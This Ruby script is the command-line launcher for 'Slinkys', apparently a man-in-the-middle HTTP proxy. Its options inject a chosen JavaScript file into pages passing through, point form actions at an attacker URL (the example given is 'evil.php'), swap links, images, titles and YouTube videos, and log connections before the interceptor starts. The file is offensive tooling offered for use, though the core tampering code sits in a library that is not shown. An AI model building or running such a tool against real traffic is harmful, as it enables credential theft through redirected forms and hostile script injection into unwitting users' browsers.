require 'webrick/httpproxy'
require "optparse"
require "slinkys"
require "uri"

begin
	options = {}
	OptionParser.new do |opt|
		opt.banner = "Usage:Slinkys <Options> <Command>\n"

		opt.on("-a","--attribute ","Replace all Link on page| -a <URL>") do |i|
			options[:replace_link] = i
		end

		opt.on("-f","--form " ,"Replace form action | -f <url/evil.php>") do |i|
			options[:replace_action_form] = i
		end

		opt.on("-i","--image ","Image replace | -i <URL Image>") do |i|
			options[:image] = i
		end

		opt.on("-l","--log ","Create File Log | -l log.txt") do |i|
			options[:log] = i
		end

		opt.on("-p","--port ","Port on listan | -p 8000 (default is 8080)") do |i|
			options[:port] = i
		end

		opt.on("-s", "--script ","Injection Script | -s script.js") do |i|
			options[:script] = i
		end	

		opt.on("-t","--title ","Change Title Page | -t 'You Text'") do |i|
			options[:replace_title] = i
		end

		opt.on("-y","--youtube ","Replace youtube video | -y <YouTube Link>") do |i|
			options[:youtube_id] = i
		end
	end.parse!
rescue OptionParser::MissingArgument => e
	puts e
	exit
end

script_injection = {:action => false,:src => options[:script]} 
image_replace = {:action => false,:src => options[:image]}
youtube_video_replace = {:action => false,:id => options[:youtube_id]}
replace_title = {:action => false, :title => options[:replace_title]}
replace_link = {:action => false, :url => options[:replace_link]}
replace_form = {:action => false, :url => options[:replace_action_form]}
log = {:action => false,:src => options[:log]}

script_injection[:action] = true if options[:script] != nil and File.exists? options[:script]
image_replace[:action] = true if options[:image] != nil
youtube_video_replace[:action] = true if options[:youtube_id] != nil and URI(options[:youtube_id]).query.index("v=") != nil # UPDATE 
replace_title[:action] = true if options[:replace_title] != nil
replace_link[:action] = true if options[:replace_link] != nil 
replace_form[:action] = true if options[:replace_action_form] != nil
log[:action] = true if options[:log] != nil
if options[:port] != nil and options[:port].size == 4 and options[:port].to_i != 0 then port = options[:port].to_i else port = 8080 end

print "\nScript Injection:\t\t#{script_injection[:action]}
Image Replace:\t\t\t#{image_replace[:action]}
YouTube Video Replace:\t\t#{youtube_video_replace[:action]}
Title Url Replace:\t\t#{replace_title[:action]}
All Link Replace:\t\t#{replace_link[:action]}
Form Action Replace:\t\t#{replace_form[:action]}
Print Log Connection:\t\t#{log[:action]}
Port:\t\t\t\t#{port}\n\n".gsub("true","Enabled").gsub("false","Disabled")

Slinkys::MITM.new(script_injection,image_replace,youtube_video_replace,replace_title,replace_link,replace_form,log,port).run



